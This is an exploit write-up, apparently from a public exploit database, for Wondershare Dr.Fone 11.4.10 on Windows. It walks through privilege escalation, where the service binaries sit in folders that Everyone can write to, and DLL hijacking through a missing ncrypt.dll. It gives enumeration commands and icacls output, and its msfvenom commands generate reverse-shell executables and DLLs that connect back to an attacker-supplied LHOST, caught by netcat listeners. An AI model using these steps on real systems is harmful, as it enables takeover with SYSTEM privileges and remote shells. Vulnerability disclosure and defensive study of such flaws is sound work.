# Wondershare Dr.Fone 11.4.10 - Privilege Escalation and DLL Hijacking
```
Date: 04/25/2022
Exploit Author: AkuCyberSec (https://github.com/AkuCyberSec)
Vendor Homepage: https://drfone.wondershare.com/
Software Link: https://download.wondershare.com/drfone_full3360.exe
Version: 11.4.10
Tested on: Windows 10 64-bit
```

### WARNING: The application folder "Wondershare Dr.Fone" may be different (e.g it will be "drfone" if we download the installer from the italian website)

## Privilege Escalation
The application "Wondershare Dr. Fone" comes with 3 services: 
1. DFWSIDService
2. ElevationService
3. Wondershare InstallAssist

All the folders that contain the binaries for the services have weak permissions.
These weak permissions allow any authenticated user to get SYSTEM privileges.

First, we need to check if services are running using the following command:
```
wmic service get name,displayname,pathname,startmode,startname,state | findstr /I wondershare

Wondershare WSID help                     DFWSIDService               C:\Program Files (x86)\Wondershare\Wondershare Dr.Fone\WsidService.exe                          Auto 	LocalSystem		Running  
Wondershare Driver Install Service help   ElevationService            C:\Program Files (x86)\Wondershare\Wondershare Dr.Fone\Addins\SocialApps\ElevationService.exe	Auto 	LocalSystem     Running  
Wondershare Install Assist Service        Wondershare InstallAssist	C:\ProgramData\Wondershare\Service\InstallAssistService.exe                                     Auto 	LocalSystem     Running  
```

Now we need to check if we have enough privileges to replace the binaries:

```
icacls "C:\Program Files (x86)\Wondershare\Wondershare Dr.Fone"
Everyone:(OI)(CI)(F) <= the first row tells us that Everyone has Full Access (F) on files (OI = Object Inherit) and folders (CI = Container Inherit)
...

icacls "C:\Program Files (x86)\Wondershare\Wondershare Dr.Fone\Addins\SocialApps"
Everyone:(I)(OI)(CI)(F) <= same here
...

icacls "C:\ProgramData\Wondershare\Service"
Everyone:(I)(OI)(CI)(F) <= and here
...
```

1. Create an exe file with the name of the binary we want to replace  (e.g. WsidService.exe if we want to exploit the service "Wondershare WSID help") 
2. Put it in the folder (e.g. C:\Program Files (x86)\Wondershare\Wondershare Dr.Fone\)
3. After replacing the binary, wait the next reboot (unless the service can be restarted manually)

As a proof of concept we can generate a simple reverse shell using msfvenom, and use netcat as the listener:
```
simple payload: msfvenom --payload windows/shell_reverse_tcp LHOST=<YOUR_IP_ADDRESS> LPORT=<YOUR_PORT> -f exe > WsidService.exe
listener: nc -nlvp <YOUR_PORT>
```

## DLL Hijacking
The application DrFoneToolKit.exe is placed in the following folder:
C:\Program Files (x86)\Wondershare\Wondershare Dr.Fone\DrFoneToolKit.exe

Using icacls we can see that the folder has weak permissions:
icacls "C:\Program Files (x86)\Wondershare\Wondershare Dr.Fone"
Everyone:(OI)(CI)(F) <= the first row tells us that Everyone has Full Access (F) on files (OI = Object Inherit) and folders (CI = Container Inherit)

Now we use Process Monitor from Sysinternals to check if it fails to load any DLL from that folder.
1. Run Process Monitor 
2. Click on "Filter", remove any filter and add the followings:
```
[Column; Relation; Value; Action]
Process Name; is; DrFoneToolKit.exe; Include
Result; contains; NAME NOT FOUND; Include
Path; ends with; .dll; Include
Result; contains; SUCCESS; Exclude
Path; begins with; C:\Windows; Exclude
```
3. Be sure the capture is enabled, then run DrFoneToolKit.exe

In the output window we should see all the DLLs that the application fails to load from its folder.
There are several DLLs we can hijack but the easiest one, based on my tests, is ncrypt.dll, since this DLL does NOT need to "work as a proxy".

In order to exploit this vulnerability:
1. Create a DLL (32-bit) named ncrypt.dll and place it in the application folder
2. Run the application

As a proof of concept we can generate a simple reverse shell using msfvenom, and use netcat as the listener:
```
simple payload: msfvenom --payload windows/shell_reverse_tcp LHOST=<YOUR_IP_ADDRESS> LPORT=<YOUR_PORT> -f dll > ncrypt.dll
listener: nc -nlvp <YOUR_PORT>
```

### Please note that creating a DLL from scratch (e.g. in C++) can prevent the application from crashing after the DLL has been loaded.
